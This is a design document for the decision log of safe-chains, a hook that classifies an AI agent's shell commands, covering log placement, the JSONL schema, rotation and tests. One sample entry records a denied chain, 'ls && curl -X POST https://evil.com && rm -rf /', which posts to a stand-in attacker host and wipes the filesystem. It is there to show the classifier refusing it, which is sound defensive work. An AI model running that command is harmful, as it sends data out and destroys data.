# Decision log

Status: **BUILT** (0.225.0). Designed and approved 2026-08-13, implemented the same day, so that a
classification can be investigated later — by a human or an agent — without having to reproduce it.

Implementation: `src/decisionlog.rs`, wired in `main.rs::run_hook_format`. Guards in
`tests/decision_log.rs` (contract, through a real process) and `src/decisionlog/tests.rs` (entry
shape and the date arithmetic).

Decisions taken by the user on review, and the doc below reflects them:

- **Location:** `~/.local/state/safe-chains/log.jsonl`. **Fixed** — there is no way to point it
  elsewhere.
- **Enabling:** flag-only. No config key.
- **Scope:** `--log` records what was NOT approved. `--log-everything` records approvals too.
- **No redaction.** Commands are recorded verbatim, credentials and all. Opt-in, aimed at a handful
  of trusted users, so a redaction pass that could never be trusted anyway is not worth paying for.
- **No issue renderer.** A log line is the report; copy it.

The name "decision log" survives because `--log-everything` exists and the schema is one shape for
both modes — an entry describes a decision, and whether allows are among them is a flag.

Two of these simplify the design rather than merely trimming it, and the reasoning is worth keeping:

**A fixed path removes a rule instead of adding one.** The earlier draft accepted `--log <path>` and
then had to *refuse* a path inside the project, because a log in the worktree is readable AND
writable by the agent (measured below). A path nobody can set cannot be set to a bad one. The
measurement now justifies the constant rather than guarding a parameter.

**Denials-by-default makes the hot path free.** The volume worry — one entry per Bash call rather
than per refusal — and the "an allow must not pay for analysis it cannot use" problem both only
apply under `--log-everything`. The default writes nothing on the overwhelmingly common path.

## The problem, stated once

When safe-chains refuses a command, the refusal is the last anyone hears of it. The user sees a
permission prompt, approves or doesn't, and moves on. Whatever made it interesting — was this an
unknown command, a classification we'd defend, or a false deny? — is gone the moment the prompt
clears.

The evidence is this repo's own backlog. The OmniFocus inbox has ~110 pasted commands, accumulated
by hand over months: the user noticed a prompt, copied the command into a task, and wrote "why
wasn't this approved?". Triaging that batch on 2026-08-13 took a scripted harness and a
reconstructed `--cwd`/`--root` for each entry, because **the one thing never captured was the
context the classifier actually ran in**. Several entries could only be triaged as "probably fine on
the machine it was filed from" — they carried `/Users/mhopkins` paths from a different host, and
whether they denied depended on a `$HOME` nobody recorded.

A log written at decision time has all of that for free.

## What one entry has to answer

These are the questions actually asked during that triage, in the order they got asked:

1. **What was the command, exactly?** Not retyped from memory — the bytes the harness passed.
2. **Where was it run?** `cwd` and project root. Most classifications are locus decisions, so a
   denial without the directory is not reproducible.
3. **Is this an unknown command or a decision?** The single highest-value split. An unknown command
   is a registry gap and a candidate for a TOML entry. A recognized command refused by a facet is a
   *classification* we either defend or revisit. `suggest::Outcome` already computes exactly this
   distinction (`RecognizedButDenied` vs `Generated`) and nothing consumes it at refusal time.
4. **Which segment failed?** For a chain, `explain` already names the culprit; a bare "denied" sends
   the reader to re-derive it.
5. **Why?** For a single command, `explain` names the resolved facet profile and the clause that
   refused it (`locus.remote = fixed (allowed: none..=none)`). That IS the answer to "is this
   right?", and it is currently printed to a terminal nobody is reading.
6. **Which safe-chains, on which harness?** Version, and which target's hook. A denial from
   0.219 that no longer reproduces is noise, and knowing that immediately is worth a field.

## What the classifier already knows

Nothing here needs new analysis; the feature is almost entirely plumbing. Sources, as of 0.224.0:

| Field | Where it already comes from |
|---|---|
| command | `HookInput.command` |
| cwd | `HookInput.cwd` (Claude sends it in the envelope) |
| root | `HookInput.root` (`env_root("CLAUDE_PROJECT_DIR")` and per-target equivalents) |
| session id | `HookInput.session_id` |
| harness | which `targets/*.rs` format parsed the envelope |
| verdict, per-segment | `cst::explain::Explanation` — `overall`, `segments[]`, `culprit`, `stateful`, `parsed` |
| facet profile + refusing clause | the engine, as rendered today under `--explain` |
| unknown vs recognized | `suggest::analyze()` → `Outcome` |
| level in force | `crate::resolved_level()` (default `developer`, or the user config ceiling) |
| version | `env!("CARGO_PKG_VERSION")` |

## The log holds raw commands, credentials included

Decided: **no redaction.** The log records what was run, verbatim. Two reasons this is the right
call rather than a shortcut. Eliding "things that look like secrets" is a denylist, and a denylist
fails open on the one shape nobody listed — while printing a "redacted" banner that tells the reader
it is safe to paste, which is worse than saying nothing. And the feature is opt-in for a handful of
trusted users, so the honest posture is to say what the file contains and let the user decide where
it goes.

What follows from that is placement, not filtering. The log is `0600`, outside any repository, and
**out of the agent's reach in both directions**. An agent that can read it gets other sessions'
credentials; an agent that can write it can poison a report you would file in good faith.

Measured against 0.224.0 at the default `developer` level, from a project cwd:

| candidate location | agent read | agent write |
|---|---|---|
| `~/.safe-chains/log.jsonl` | DENY | DENY |
| `~/.local/state/safe-chains/log.jsonl` | DENY | DENY |
| `~/Library/Logs/safe-chains/log.jsonl` | DENY | DENY |
| `./log.jsonl` (in the worktree) | **ALLOW** | **ALLOW** |

Every home-based location is already closed by the path model; a worktree-local log is wide open in
BOTH directions. That asymmetry is the whole argument for the path being a constant: the only
locations that are wrong are ones a user would have to opt into, so not offering the choice is
strictly safer than validating it.

**Decided:** `~/.local/state/safe-chains/log.jsonl`, fixed. It is state rather than config, it does
not collide with `~/.config/safe-chains.toml` (the trust root, which must stay boring), and it is
closed to the agent today.

## Format: JSON Lines

One JSON object per line, append-only, `schema` versioned from day one.

JSONL because both consumers want the same thing. "Which unknown commands did I hit most this month"
is the question that turns this log into a work queue, and it is one `jq | sort | uniq -c` away from
a JSONL file and unanswerable from prose. Pasting into an issue wants a self-contained record with
every field named — which a JSON object already is. Prose would have been a second representation
serving neither better, which is why the renderer was dropped.

### Fields

| field | type | notes |
|---|---|---|
| `schema` | int | bump on any incompatible change |
| `id` | string | `<unix-ms>-<8 hex of sha256(command)>`. The hash half groups repeats of one command without any dedup machinery |
| `at` | string | RFC 3339, UTC |
| `version` | string | safe-chains version |
| `harness` | string | `claude`, `codex`, … , or `cli` |
| `outcome` | string | `allowed` \| `denied` \| `abstained` \| `unparseable` |
| `level` | string | the level in force |
| `command` | string | verbatim |
| `cwd` / `root` | string\|null | null when the harness didn't send it — itself worth knowing |
| `session_id` | string\|null | correlates entries within one agent run |
| `triage` | string | `allowed` \| `unknown-command` \| `recognized-but-denied` \| `unparseable`. From `suggest::analyze`, whose `AlreadyAllowed` short-circuits before any work |
| `unknown_commands` | [string] | the names that aren't in the registry — the registry-gap worklist |
| `segments` | [obj] | `{text, verdict, culprit}` per top-level segment |
| `stateful` | bool | segments share shell state, so "split them up" is not advice that works |
| `facets` | obj\|null | resolved profile + refusing clause, single-command case only |

Deliberately **not** included: environment variables (a secrets firehose with no triage value), the
full harness envelope (ditto), and any transcript reference (path to a file full of everything).

## What an entry looks like

Real classifier output as of 0.224.0, formatted for reading. On disk each is one line.

### 1. Unknown command — the registry-gap case, and the one worth an issue

```json
{
  "schema": 1,
  "id": "1786664461233-9f2c41ab",
  "at": "2026-08-13T23:41:01.233Z",
  "version": "0.224.0",
  "harness": "claude",
  "outcome": "denied",
  "level": "developer",
  "command": "mise exec --cd /w -- ruby -S bundle exec rspec 2>&1 | tail -4",
  "cwd": "/src/my-app",
  "root": "/src/my-app",
  "session_id": "c63f6e43-c07a-43e1-92ae-217729f06dbc",
  "triage": "unknown-command",
  "unknown_commands": ["mise"],
  "segments": [
    {
      "text": "mise exec --cd /w -- ruby -S bundle exec rspec 2>&1 | tail -4",
      "verdict": "denied",
      "culprit": "mise"
    }
  ],
  "stateful": false
}
```

### 2. Allowed — the common case, and the cheap one

```json
{
  "schema": 1,
  "id": "1786664470118-1c4e88d0",
  "at": "2026-08-13T23:41:10.118Z",
  "version": "0.224.0",
  "harness": "claude",
  "outcome": "allowed",
  "level": "developer",
  "command": "git diff --name-only",
  "cwd": "/Users/michaelhopkins/projects/safe-chains",
  "root": "/Users/michaelhopkins/projects/safe-chains",
  "session_id": "c63f6e43-c07a-43e1-92ae-217729f06dbc",
  "triage": "allowed",
  "unknown_commands": [],
  "segments": [
    { "text": "git diff --name-only", "verdict": "allowed", "culprit": null }
  ],
  "stateful": false
}
```

`facets` and `unknown_commands` stay empty for an allow — there is no refusal to explain and no
registry gap. This is the entry that dominates the file by volume, which is why it must not pay for
analysis it cannot use.

### 3. Recognized but refused — the classification case

```json
{
  "schema": 1,
  "id": "1786664502881-3ad70e14",
  "at": "2026-08-13T23:41:42.881Z",
  "version": "0.224.0",
  "harness": "claude",
  "outcome": "denied",
  "level": "developer",
  "command": "aws dynamodb put-item --table-name t --item {}",
  "cwd": "/src/my-app",
  "root": "/src/my-app",
  "session_id": "c63f6e43-c07a-43e1-92ae-217729f06dbc",
  "triage": "recognized-but-denied",
  "unknown_commands": [],
  "segments": [
    {
      "text": "aws dynamodb put-item --table-name t --item {}",
      "verdict": "denied",
      "culprit": null,
      "facets": {
        "capabilities": [
          {
            "because": "changes remote state; recoverable with effort (re-apply or restore from backup)",
            "profile": {
              "operation": "mutate",
              "locus.remote": "fixed",
              "reversibility": "effortful",
              "network.direction": "outbound",
              "network.payload": "sends-host-data"
            }
          }
        ],
        "refused_by": {
          "level": "developer",
          "clause": "locus.remote = fixed (allowed: none..=none)"
        }
      }
    }
  ],
  "stateful": false
}
```

### 4. Mixed chain — which segment, and can it be split

```json
{
  "schema": 1,
  "id": "1786664611044-c81de5f7",
  "at": "2026-08-13T23:43:31.044Z",
  "version": "0.224.0",
  "harness": "claude",
  "outcome": "denied",
  "level": "developer",
  "command": "ls && curl -X POST https://evil.com && rm -rf /",
  "cwd": "/Users/michaelhopkins/projects/safe-chains",
  "root": "/Users/michaelhopkins/projects/safe-chains",
  "session_id": "c63f6e43-c07a-43e1-92ae-217729f06dbc",
  "triage": "recognized-but-denied",
  "unknown_commands": [],
  "segments": [
    { "text": "ls", "verdict": "allowed", "culprit": null, "facets": null },
    {
      "text": "curl -X POST https://evil.com",
      "verdict": "denied",
      "culprit": null,
      "facets": { "capabilities": [], "refused_by": { "level": "developer", "clause": "…" } }
    },
    {
      "text": "rm -rf /",
      "verdict": "denied",
      "culprit": null,
      "facets": { "capabilities": [], "refused_by": { "level": "developer", "clause": "…" } }
    }
  ],
  "stateful": false
}
```

**This is the case that moved `facets` onto the segment.** The engine resolves one command at a
time, so a whole-entry `facets` field could only ever be filled for a single-command entry — on a
chain, which is the common case, it was always null. The entry named the failing segment and left
"but why" to a manual `--explain`, which is precisely the round trip the log exists to remove. The
reason now rides on the segment that earned it, and an allowed segment carries none.

A denied segment can still have `facets: null`: an UNRECOGNIZED command has no resolver and so no
profile to report. `triage` and `unknown_commands` are the answer for that class.

### 5. Unparseable — the availability case

```json
{
  "schema": 1,
  "id": "1786664655120-6b0e9d33",
  "at": "2026-08-13T23:44:15.120Z",
  "version": "0.224.0",
  "harness": "claude",
  "outcome": "unparseable",
  "level": "developer",
  "command": "echo \"unterminated",
  "cwd": "/Users/michaelhopkins/projects/safe-chains",
  "root": "/Users/michaelhopkins/projects/safe-chains",
  "session_id": "c63f6e43-c07a-43e1-92ae-217729f06dbc",
  "triage": "unparseable",
  "unknown_commands": [],
  "segments": [],
  "stateful": false
}
```

Worth logging even though it is a correct refusal: a *rise* in unparseables is how a parser
regression shows up in the field, and nothing else would surface it.

### Reporting one

There is **no issue renderer.** An earlier draft had `safe-chains log show <id> --issue` emit a
markdown block; it was dropped, and rightly — the JSON line already carries every field a maintainer
needs, `jq` already selects it, and a second rendering is a second thing to keep in step with the
schema. Copying the line is the workflow.

That does move the "read it before you post" moment onto the user rather than a footer in generated
output, which is the honest place for it given there is no redaction anyway.

## Enabling it

The hook is configured as a command string, so a flag is the only surface that composes into one.
Two of them, both boolean, neither taking a value:

| flag | records |
|---|---|
| `--log` | everything that did NOT auto-approve — denials, abstains, parse failures |
| `--log-everything` | the above, plus approvals |

Reading is `jq` against the file. There is no reader subcommand.

**Decided: flag-only.** No `log = true` in `~/.config/safe-chains.toml`. That file is *the* trust
anchor, and giving it a second job means a syntax error there breaks logging too — the config-load
path already fails safe by skipping the whole file, which would silently disable logging at the same
moment it disabled custom commands. Flag-only is explicit and per-harness. The cost is that `--setup`
rewriting a hook drops the flag, which is worth a note in the user docs.

`SAFE_CHAINS_LOG` as an env var is **rejected**, and with a fixed path there is nothing for it to
set anyway. The reason is worth recording for whoever proposes it next: `custom.rs` already refuses
to honour `XDG_CONFIG_HOME` because the agent's environment reaches the hook, so an env-settable log
path is an agent-settable one.

## Non-negotiables for the implementation

**Fail open, silently.** A `PreToolUse` hook that crashes fails OPEN — the harness proceeds. This is
already the recorded reason `cst/explain` is held to a never-panics contract. Every logging path
therefore gets the same treatment: unwritable directory, full disk, read-only filesystem, a path
that is a directory, a `$HOME` that does not exist — each must classify normally and log nothing.
No `unwrap`, no `?` that escapes into the hook's return, no panic. **Logging is never a reason a
command fails to be classified.**

**Atomic append under concurrency.** Parallel tool calls and multiple sessions write the same file.
Entries exceed `PIPE_BUF`, so `O_APPEND` alone does not guarantee atomicity — take an advisory
`flock` for the write and release it immediately. A torn line is worse than a missing one: it breaks
every `jq` consumer for the whole file. (The alternative, one file per entry in a spool directory, is
atomic via `rename` with no locking; it is more robust and more files. Worth reconsidering if
locking gets awkward.)

**Bounded growth — take the shape from the platforms, not from one machine's usage.** The first cut
was 8 MB keeping ONE old file, a number reasoned from how much the author happened to run. Both
halves were wrong, and the count more than the size: macOS ships `/etc/newsyslog.conf` at 1000 KB
with a **count of 5**, and logrotate's own manual example is `weekly` + **`rotate 5`**. Keeping a
single generation is the part no convention supports.

Now 16 MB × 5 generations, shifted oldest-first so no rename clobbers a file that has not moved yet.
16 MB sits in logrotate's usual band for an application log and holds ~22k entries at the measured
754-byte mean — years under `--log`, weeks of heavy use under `--log-everything`.

Size-based rather than time-based, which is the one place this deliberately departs from the
`weekly` convention: safe-chains is a short-lived hook process, not a daemon with a cron entry, so
there is nothing to run a scheduled rotation. The size is checked when the file is opened.

**Decide the outcome before doing the work.** The default mode's whole advantage is that it does
nothing on the common path, and that is only true if the allow/deny test comes FIRST. Classify,
check whether this entry will be written at all, and only then build it — an implementation that
assembles an entry and discards it under `--log` has thrown the benefit away while looking correct.

**An allow entry must stay cheap even when it is written.** Under `--log-everything` allows dominate
and sit on the hot path. `facets` and `triage` are meaningless for one, and `suggest::analyze`
already short-circuits on `AlreadyAllowed`, so record the verdict and segments and skip the rest.
Worth measuring rather than assuming: if `explain` on every allow is still too costly, an allow
entry may degrade to command + cwd + verdict — but the doc says so, rather than the code quietly
doing it.

## Testing

The repo's standard applies: property guards over the classes, not examples.

- **Never breaks classification.** Enumerate the failure modes above; for each, assert the verdict is
  byte-identical to the same run with logging off. This is the guard that matters — everything else
  is cosmetics.
- **Every entry round-trips.** Generated entries parse back as valid JSON with the declared schema;
  run it over the registry's `examples_denied` corpus so new commands are covered automatically.
- **Concurrency.** N threads logging simultaneously produce N well-formed lines and zero torn ones.
- **The two modes differ in exactly one way**, and both halves need pinning because each is the
  other's fail case. Over `examples_safe`: `--log` writes nothing, `--log-everything` writes an entry
  with `outcome: "allowed"`. Over `examples_denied`: both write the same entry. A bug that logs
  allows under `--log` is a volume and privacy surprise; one that drops them under
  `--log-everything` silently defeats the flag.
- **Off means off.** With neither flag, no file is created — not an empty one, not a directory.

## What building it taught

**The fail-open guard was vacuous on its first cut, and looked thorough.** It drove a read-only
`$HOME` and a nonexistent one, which reads like coverage of "the log cannot be written". Neither
reaches the write: `create_dir_all` returns first on the read-only home, and a missing home is
simply *created*. Replacing the file open with an `expect` left the guard green. It needed a home
where the tree is fine but the log PATH is occupied by a directory — plus `HOME` unset entirely — to
exercise the open, the write and the rotate at all. The lesson generalises past this feature: a
fail-open test that never reaches the failing call is the most convincing kind of nothing.

**Two registry guards caught the new flags before any human did**, and both were right to. A boolean
`write_flag` normally means "this command rewrites its operands", so
`a_boolean_write_flag_gates_its_operands` and `ambiguous_output_flags_do_not_write_sensitive_paths`
both demanded a path gate. safe-chains has none to give: the positional after `--log` is the command
string to classify, and the destination is a compiled-in constant. Both fixtures now carry the row
with that reason spelled out — the fixed path paying off a second time, in a place the design did
not anticipate.

**The level name disagreed with `--explain`.** The log first took `SafetyLevel::to_string()` and
recorded the legacy band name (`safe-write`) for a run `--explain` called `developer`. Now both read
`engine::bridge::default_band_top_name()`. A diagnostic that contradicts the tool it diagnoses is
worse than no diagnostic, and two names for one level is exactly how that starts.

**The design doc's sample timestamps were wrong.** The `id` embeds unix-ms and `at` is its RFC 3339
rendering, and the constants written into the samples disagreed by two days — invented, never
checked. The round-trip test on the date arithmetic passed while the *documentation* was wrong,
which is its own reminder: samples people copy deserve the same verification as code.

## Not in v1

Deliberately deferred or declined, listed so they are not mistaken for oversights:

- **A configurable log path.** Declined, not deferred — see the fixed-path argument above.
- **Any reader subcommand**, issue rendering included. `jq` is the reader.
- **Dedup or aggregation.** `jq | sort | uniq -c` answers it, and the `id`'s command-hash half
  already groups repeats.
- **A `--since` query language**, uploading anywhere, and redaction of any kind.
